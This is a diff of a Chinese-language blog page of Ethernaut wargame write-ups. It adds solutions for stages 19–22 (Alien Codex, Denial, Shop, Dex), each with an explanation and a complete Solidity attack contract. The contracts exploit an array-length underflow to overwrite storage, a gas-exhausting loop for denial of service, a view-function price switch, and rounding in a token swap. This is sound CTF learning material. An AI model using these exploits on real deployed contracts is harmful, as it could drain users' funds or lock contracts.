@@ -5,7 +5,7 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="https://Cauliweak9.github.io">
+  <link rel="dns-prefetch" href="https://cauliweak9.github.io">
   <title>Ethernaut | 9C±Void&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://cauliweak9.github.io/2024/01/21/Ethernaut/Token.png">
 <meta property="og:image" content="https://cauliweak9.github.io/2024/01/21/Ethernaut/Recovery.png">
 <meta property="article:published_time" content="2024-01-21T00:48:12.000Z">
-<meta property="article:modified_time" content="2024-04-12T03:55:38.674Z">
+<meta property="article:modified_time" content="2024-05-10T15:36:58.638Z">
 <meta property="article:author" content="9C±Void">
 <meta property="article:tag" content="Web3">
 <meta name="twitter:card" content="summary">
@@ -237,7 +237,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">6.7k字</span>
+      <span class="post-count">8.7k字</span>
     </span>
   </span>
 
@@ -246,7 +246,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">26分</span>
+      <span class="post-count">35分</span>
     </span>
   </span>
 </div>
@@ -327,14 +327,12 @@
 </ol>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _value</span>) &#123;</span><br><span class="line">  tokens[tx.<span class="property">origin</span>] -= _value;</span><br><span class="line">  tokens[_to] += _value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<ol>
+<ol start="2">
 <li>攻击者通过调用合约的 transfer 函数是受害者向恶意合约转移资产, 比如</li>
 </ol>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> (<span class="params"></span>) payable &#123;</span><br><span class="line">  token.<span class="title function_">transfer</span>(attackerAddress, <span class="number">10000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<ol>
-<li>在这个情况下, <code>tx.origin</code> 是受害者的地址 ( <code>msg.sender</code> 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.</li>
-</ol>
+<p>​	在这个情况下, <code>tx.origin</code> 是受害者的地址 ( <code>msg.sender</code> 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.</p>
 <h2 id="Stage-5-Token"><a href="#Stage-5-Token" class="headerlink" title="Stage 5    Token"></a>Stage 5    Token</h2><p>看到pragma solidity ^0.6.0我就知道事情不对了（笑）</p>
 <p>跟着Chainlink的教程学Solidity的时候就有了解到相关的东西，挺难绷的（当时他们还是用的0.6的Solidity，我自己找0.8的相关东西折磨死了，<a target="_blank" rel="noopener" href="http://还有那个逼web3.py/">还有那个逼web3.py</a>，受不了一点）</p>
 <p>这题给的提示是odometer，即油量表，对应的考点是整型溢出攻击（Overflow）</p>
@@ -469,6 +467,56 @@
 
 
 
+<h2 id="Stage-19-Alien-Codex"><a href="#Stage-19-Alien-Codex" class="headerlink" title="Stage 19 Alien Codex"></a>Stage 19 Alien Codex</h2><p>这题其实算是一道综合题，需要的前置知识是solidity ≤ 0.6的整型溢出，solidity ≤ 0.5 可对动态数组的length属性进行修改以修改数组长度，还有状态变量在内存的排布方式</p>
+<p>这里先给出Ownable-05.sol的位置：<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol%EF%BC%8C%E6%88%91%E5%81%9A%E8%BF%99%E9%A2%98%E7%9A%84%E6%97%B6%E5%80%99%E4%B8%80%E5%BC%80%E5%A7%8B%E6%98%AF%E7%9B%B4%E6%8E%A5%E5%AF%B9%E5%9C%B0%E5%9D%80%E7%94%A8call%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%E6%80%BB%E6%98%AFrevert%EF%BC%8C%E6%9C%80%E5%90%8E%E6%89%BE%E5%88%B0%E5%B9%B6%E5%AF%BC%E5%85%A5%E4%BA%86%E5%90%8E%E5%86%8D%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E5%B0%B1%E5%87%BA%E4%BA%86%EF%BC%8C%E9%9D%9E%E5%B8%B8%E5%A5%87%E6%80%AA">https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol，我做这题的时候一开始是直接对地址用call的，但是不知道为什么总是revert，最后找到并导入了后再直接调用函数就出了，非常奇怪</a></p>
+<p>先从动态数组的内存排布开始讲起，例如我们这题的合约，Storage Slot应该是这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Slot 0: 0x(22 zeros) 01 (address owner)</span><br><span class="line">Slot 1: codex.length</span><br><span class="line">...</span><br><span class="line">Slot keccak256(1): codex[0]</span><br><span class="line">Slot keccak256(1)+1: codex[1]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Slot 0是根据EVM的内存紧凑原则，由于<code>address owner</code>仅使用20 bytes，而<code>bool contacted</code>使用1 byte，20+1&#x3D;21&lt;32，故两个状态变量都放在Slot 0处</p>
+<p>而Slot 1存放的内容是动态数组codex的长度，这样如果访问超出数组长度的内容会revert，同时存放数组长度的Slot index也很重要，因为数组内容是从Slot keccak256(Slot index)开始存放的，比如这题codex.length是在Slot 1的，故codex[0]在Slot keccak256(1)下；同理的，如果codex.length存放在Slot 11037，那么codex[0]在Slot keccak256(11037)处</p>
+<p>不仅如此，这个版本下Solidity对内存区索引的溢出不会进行阻拦，也就是说假如我们有一个uint256 i，使得codex[i]对应的storage slot的索引是2^256-1，那么codex[i+1]对应的就会是storage slot 0了，所以假如我们让codex.length变成最大值，那么我们就获得了内存的任意读写权，非常危险</p>
+<p>了解了上面的基础知识，现在我们就可以来解决这道题了。首先我们希望codex.length变成最大值，利用整型溢出和0.5版本可直接修改length属性的特性，我们先调用retract()，然后我们根据上面的知识构造出index，data就是我们自己的地址转成bytes32，最后调用revise(index, data)就行了，所以poc如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Level19.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span>&#123;</span><br><span class="line">    <span class="title class_">AlienCodex</span> public alien_codex;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _alien_codex</span>) public&#123;</span><br><span class="line">        alien_codex = <span class="title class_">AlienCodex</span>(_alien_codex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        alien_codex.<span class="title function_">makeContact</span>();</span><br><span class="line">        alien_codex.<span class="title function_">retract</span>();</span><br><span class="line">        uint index = (<span class="number">2</span> ** <span class="number">256</span> - <span class="number">1</span>) - <span class="title function_">uint</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(<span class="number">1</span>))) + <span class="number">1</span>;</span><br><span class="line">        bytes32 data = <span class="title function_">bytes32</span>(<span class="title function_">uint256</span>(<span class="title function_">uint160</span>(tx.<span class="property">origin</span>)));</span><br><span class="line">        alien_codex.<span class="title function_">revise</span>(index, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Stage-20-Denial"><a href="#Stage-20-Denial" class="headerlink" title="Stage 20 Denial"></a>Stage 20 Denial</h2><p>这题还是好想到的，无非就那几种DoS攻击：函数表达式&#x2F;调用栈溢出，0.7及以后的整型溢出，直接revert（但是这里用的是底层call，不会终止执行流），gas耗尽这些</p>
+<p>这题很明显就是消耗所有的gas，所以搞个死循环就行了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Level20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span>&#123;</span><br><span class="line">    <span class="title class_">Denial</span> public denial;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _denial</span>)&#123;</span><br><span class="line">        denial = <span class="title class_">Denial</span>(_denial);</span><br><span class="line">        denial.<span class="title function_">setWithdrawPartner</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">receive</span>() external payable&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Stage-21-Shop"><a href="#Stage-21-Shop" class="headerlink" title="Stage 21 Shop"></a>Stage 21 Shop</h2><p>一个商店，其中购买要求卖家提供一个更高的价格才售出商品并将卖家提供的价格设定为商品价格，而题目要求是在购得商品的同时让商品价格小于初始价格</p>
+<p>看到<code>buy()</code>里面其实调用了2次<code>price()</code>函数，如果<code>price()</code>没有设置成<code>view</code>的话，我们可以在调用第一次之后修改返回的值，但是被限制住了就无法修改状态变量了</p>
+<p>那我们应该怎么办？其实我们前面的思路抽象化的话就是分为两个情况：购买时返回&gt;100的值，完成购买时返回&lt;100的值，而刚刚没有限制时的思路我们区分两种情况的依据是<strong>调用函数本身这个事件</strong>，所以如果被限制住了，我们就预先在函数保存两个值，然后<strong>在攻击合约外面找到前后状态发生改变的变量作为区分依据</strong>就可以了</p>
+<p>看一下题目合约的两个<code>price()</code>，我们发现中间有一个<code>isSold = true;</code>，刚好是我们可以利用的东西，所以我们以<code>isSold</code>为中心编写攻击合约：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Level21.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span>&#123;</span><br><span class="line">    <span class="title class_">Shop</span> public shop;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _shop</span>)&#123;</span><br><span class="line">        shop = <span class="title class_">Shop</span>(_shop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        shop.<span class="title function_">buy</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">price</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">uint256</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> shop.<span class="title function_">isSold</span>() ? <span class="number">1</span> : <span class="number">101</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们以题目合约的<code>isSold</code>作为区分依据，如果值为<code>false</code>就是没有售出，返回&gt;100的值；反之返回&lt;100的值</p>
+<h2 id="Stage-22-Dex"><a href="#Stage-22-Dex" class="headerlink" title="Stage 22 Dex"></a>Stage 22 Dex</h2><p>这题给的合约是一个交换两种ERC20代币的交易所，里面的<code>setTokens()</code>和<code>addLiquidity()</code>都是初始化的操作，而且被<code>onlyOwner</code>修饰，无法操作，我们直接跳过</p>
+<p>先看下面的两个函数<code>approve()</code>和<code>balanceOf()</code>，两个本质上都是调用的ERC20合约里面的函数，一个是调用方<code>msg.sender</code>允许作为参数的地址<code>address spender</code>调用自己一定数量<code>amount</code>的代币，一个是返回对应地址<code>address account</code>所拥有的对应代币的数量</p>
+<p><code>approve()</code>直接像上面这样形容可能不太好理解，那换个例子，就假如有个代币A，两个人B和C，假如B调用了<code>A.approve(address(C), 1000)</code>，那么就是B允许C任意使用B钱包里面总量为1000的代币A，所以C就可以使用<code>A.transferFrom(address(B), to, amount)</code>这个方法从B的钱包转出<code>amount</code>数量的代币A到任意的地址<code>to</code>去啦</p>
+<p>接下来看最长最复杂的<code>swap()</code>交换代币的函数：首先强制要求只能在<code>token1</code>和<code>token2</code>之间转换，然后要求交易请求方拥有足够的代币进行交互，接下来就是利用<code>getSwapPrice()</code>获取交换的数量，最后进行代币的交换</p>
+<p>而<code>getSwapPrice()</code>则是通过将题目合约所持有的两个代币之比乘上需要转换的数量得到最后需要交换的代币数量</p>
+<p>看起来没什么问题，对吧，但是要记得<strong>Solidity里面只有整数，没有浮点！！！</strong></p>
+<p>所以使用<code>getSwapPrice()</code>的时候，那个除法就会<strong>舍去所有的小数，只留下整数位！</strong>而这就是题目合约的漏洞！</p>
+<p>我们目前拥有的Token数量是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Token1  Token2  Token1C Token2C Transfer_Amount</span><br><span class="line">10      10      100     100     N/A</span><br></pre></td></tr></table></figure>
+
+<p>然后我们把所有Token1转成Token2，得到的<code>SwapPrice</code>就是<code>(10*100)/100=10</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Token1  Token2  Token1C Token2C Transfer_Amount</span><br><span class="line">10      10      100     100     N/A</span><br><span class="line">0       20      110     90      10</span><br></pre></td></tr></table></figure>
+
+<p>此时还没什么大不了的，但是如果我们再把所有的Token2转成Token1的话，<code>SwapPrice</code>就变成了<code>(20*110)/90=24</code>！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Token1  Token2  Token1C Token2C Transfer_Amount</span><br><span class="line">10      10      100     100     N/A</span><br><span class="line">0       20      110     90      10</span><br><span class="line">24      0       86      110     20</span><br></pre></td></tr></table></figure>
+
+<p>以此类推，最后我们得到的总转账表应该是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Token1  Token2  Token1C Token2C Transfer_Amount</span><br><span class="line">10      10      100     100     N/A</span><br><span class="line">0       20      110     90      10</span><br><span class="line">24      0       86      110     20</span><br><span class="line">0       30      110     80      24</span><br><span class="line">41      0       69      110     30</span><br><span class="line">0       65      110     45      41</span><br><span class="line">110     20      0       90      45</span><br></pre></td></tr></table></figure>
+
+<p>所以我们最后可以使用下面的攻击合约：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Level22.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span>&#123;</span><br><span class="line">    <span class="title class_">Dex</span> public dex;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _dex, address _token1, address _token2</span>)&#123;</span><br><span class="line">        dex = <span class="title class_">Dex</span>(_dex);</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        <span class="title class_">ERC20</span>(token1).<span class="title function_">transferFrom</span>(owner,<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="number">10</span>);</span><br><span class="line">        <span class="title class_">ERC20</span>(token2).<span class="title function_">transferFrom</span>(owner,<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="number">10</span>);</span><br><span class="line">        dex.<span class="title function_">approve</span>(<span class="title function_">address</span>(dex), <span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line">        dex.<span class="title function_">swap</span>(token1, token2, <span class="number">10</span>);</span><br><span class="line">        dex.<span class="title function_">swap</span>(token2, token1, <span class="number">20</span>);</span><br><span class="line">        dex.<span class="title function_">swap</span>(token1, token2, <span class="number">24</span>);</span><br><span class="line">        dex.<span class="title function_">swap</span>(token2, token1, <span class="number">30</span>);</span><br><span class="line">        dex.<span class="title function_">swap</span>(token1, token2, <span class="number">41</span>);</span><br><span class="line">        dex.<span class="title function_">swap</span>(token2, token1, <span class="number">45</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">retrieve_all</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        <span class="title class_">ERC20</span>(token1).<span class="title function_">transfer</span>(owner, <span class="number">110</span>);</span><br><span class="line">        <span class="title class_">ERC20</span>(token2).<span class="title function_">transfer</span>(owner, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先你需要自己直接调用题目合约的<code>approve</code>，让你的攻击合约可以使用你的代币并且转到自己手里，<code>attack()</code>之后调用<code>retrieve_all()</code>来收回所有的代币到自己手里（当然你也可以直接整合到<code>attack()</code>里面）</p>
+<p>这样我们就达成了题目的要求：取走题目合约其中一种代币的所有代币，同时留下一个“坏的”余额<del>（你怎么除掉0嘛）</del></p>
 <h2 id="To-be-continued…（正在激情闯关-制作当中-）"><a href="#To-be-continued…（正在激情闯关-制作当中-）" class="headerlink" title="To be continued…（正在激情闯关&#x2F;制作当中~）"></a>To be continued…（正在激情闯关&#x2F;制作当中~）</h2>
     
 
@@ -483,7 +531,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://Cauliweak9.github.io/2024/01/21/Ethernaut/" title="Ethernaut" target="_blank">https://Cauliweak9.github.io/2024/01/21/Ethernaut/</a>
+          <a href="https://cauliweak9.github.io/2024/01/21/Ethernaut/" title="Ethernaut" target="_blank">https://cauliweak9.github.io/2024/01/21/Ethernaut/</a>
         </li>
         
         <li>
@@ -614,7 +662,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">Stage 0    Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">Stage 1    Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">Stage 2    Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Stage 3    Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">Stage 4    Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-5-Token"><span class="toc-number">6.</span> <span class="toc-text">Stage 5    Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">Stage 6    Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-7-Force"><span class="toc-number">8.</span> <span class="toc-text">Stage 7    Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-8-Vault"><span class="toc-number">9.</span> <span class="toc-text">Stage 8    Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-9-King"><span class="toc-number">10.</span> <span class="toc-text">Stage 9    King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-10-Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Stage 10    Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-11-Elevator"><span class="toc-number">12.</span> <span class="toc-text">Stage 11    Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-12-Privacy"><span class="toc-number">13.</span> <span class="toc-text">Stage 12    Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-13-Gatekeeper-One"><span class="toc-number">14.</span> <span class="toc-text">Stage 13    Gatekeeper One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-14-Gatekeeper-Two"><span class="toc-number">15.</span> <span class="toc-text">Stage 14    Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-15-Naught-Coin"><span class="toc-number">16.</span> <span class="toc-text">Stage 15 Naught Coin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-16-Preservation"><span class="toc-number">17.</span> <span class="toc-text">Stage 16 Preservation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-17-Recovery"><span class="toc-number">18.</span> <span class="toc-text">Stage 17 Recovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-18-MagicNumber"><span class="toc-number">19.</span> <span class="toc-text">Stage 18 MagicNumber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-be-continued%E2%80%A6%EF%BC%88%E6%AD%A3%E5%9C%A8%E6%BF%80%E6%83%85%E9%97%AF%E5%85%B3-%E5%88%B6%E4%BD%9C%E5%BD%93%E4%B8%AD-%EF%BC%89"><span class="toc-number">20.</span> <span class="toc-text">To be continued…（正在激情闯关&#x2F;制作当中~）</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">Stage 0    Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">Stage 1    Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">Stage 2    Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Stage 3    Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">Stage 4    Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-5-Token"><span class="toc-number">6.</span> <span class="toc-text">Stage 5    Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">Stage 6    Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-7-Force"><span class="toc-number">8.</span> <span class="toc-text">Stage 7    Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-8-Vault"><span class="toc-number">9.</span> <span class="toc-text">Stage 8    Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-9-King"><span class="toc-number">10.</span> <span class="toc-text">Stage 9    King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-10-Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Stage 10    Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-11-Elevator"><span class="toc-number">12.</span> <span class="toc-text">Stage 11    Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-12-Privacy"><span class="toc-number">13.</span> <span class="toc-text">Stage 12    Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-13-Gatekeeper-One"><span class="toc-number">14.</span> <span class="toc-text">Stage 13    Gatekeeper One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-14-Gatekeeper-Two"><span class="toc-number">15.</span> <span class="toc-text">Stage 14    Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-15-Naught-Coin"><span class="toc-number">16.</span> <span class="toc-text">Stage 15 Naught Coin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-16-Preservation"><span class="toc-number">17.</span> <span class="toc-text">Stage 16 Preservation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-17-Recovery"><span class="toc-number">18.</span> <span class="toc-text">Stage 17 Recovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-18-MagicNumber"><span class="toc-number">19.</span> <span class="toc-text">Stage 18 MagicNumber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-19-Alien-Codex"><span class="toc-number">20.</span> <span class="toc-text">Stage 19 Alien Codex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-20-Denial"><span class="toc-number">21.</span> <span class="toc-text">Stage 20 Denial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-21-Shop"><span class="toc-number">22.</span> <span class="toc-text">Stage 21 Shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stage-22-Dex"><span class="toc-number">23.</span> <span class="toc-text">Stage 22 Dex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-be-continued%E2%80%A6%EF%BC%88%E6%AD%A3%E5%9C%A8%E6%BF%80%E6%83%85%E9%97%AF%E5%85%B3-%E5%88%B6%E4%BD%9C%E5%BD%93%E4%B8%AD-%EF%BC%89"><span class="toc-number">24.</span> <span class="toc-text">To be continued…（正在激情闯关&#x2F;制作当中~）</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -674,7 +722,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023-2024 <a href="https://Cauliweak9.github.io/" target="_blank">9C±Void</a>
+    		&copy; 2023-2024 <a href="https://cauliweak9.github.io/" target="_blank">9C±Void</a>
     	</div>
       	<div class="footer-right">
 			
@@ -801,11 +849,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随想</a>
+                <a href="javascript:void(0)" class="js-tag color4">入门...大概？</a>
